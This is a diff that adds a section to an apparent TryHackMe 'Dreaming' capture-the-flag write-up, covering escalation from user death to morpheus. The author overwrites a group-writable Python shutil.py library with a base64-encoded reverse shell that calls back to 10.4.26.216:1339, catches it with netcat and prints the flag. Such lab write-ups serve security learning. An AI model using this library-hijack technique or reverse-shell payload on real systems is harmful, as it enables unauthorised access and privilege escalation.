@@ -290,3 +290,52 @@ Got my shell as death
 THM{1M_TH3R3_4_TH3M}
 
 ```
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql
+
+## 3rd
+```
+death@dreaming:/home/morpheus$ cat restore.py                 cat restore.py
+cat restore.py
+from shutil import copy2 as backup
+
+src_file = "/home/morpheus/kingdom"
+dst_file = "/kingdom_backup/kingdom"
+
+backup(src_file, dst_file)
+print("The kingdom backup has been done!")
+death@dreaming:/home/morpheus$ 
+```
+found this python file on morpheus home directory
+i will search for shutil on the linuxs
+```
+death@dreaming:/home/morpheus$ find /  -name shutil.py -ls 2>/find /  -name shutil.py -ls 2>/dev/null
+find /  -name shutil.py -ls 2>/dev/null
+   263928     52 -rw-rw-r--   1 root     death       51474 Aug  7 23:52 /usr/lib/python3.8/shutil.py
+     4867     51 -rw-r--r--   1 root     root        51474 May 26  2023 /snap/core20/1974/usr/lib/python3.8/shutil.py
+     4861     51 -rw-r--r--   1 root     root        51474 May 26  2023 /snap/core20/2015/usr/lib/python3.8/shutil.py
+death@dreaming:/home/morpheus$ 
+```
+we see that in the first file, The user death is in group, so we can write into the file.
+```
+import os,pty,socket;s=socket.socket();s.connect(("10.4.26.216",1339));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
+```
+Into base64, the write in the file
+```
+echo aW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTAuNC4yNi4yMTYiLDEzMzkpKTtbb3MuZHVwMihzLmZpbGVubygpLGYpZm9yIGYgaW4oMCwxLDIpXTtwdHkuc3Bhd24oInNoIik= | base64 -d > /usr/lib/python3.8/shutil.py
+
+
+└─$ sudo rlwrap nc -lvnp 1339
+[sudo] password for bloman: 
+listening on [any] 1339 ...
+connect to [10.4.26.216] from (UNKNOWN) [10.10.216.211] 54478
+$ $ id
+id
+uid=1002(morpheus) gid=1002(morpheus) groups=1002(morpheus),1003(saviors)
+$ whoami
+whoami
+morpheus
+$ 
+THM{DR34MS_5H4P3_TH3_W0RLD}
+
+```
+
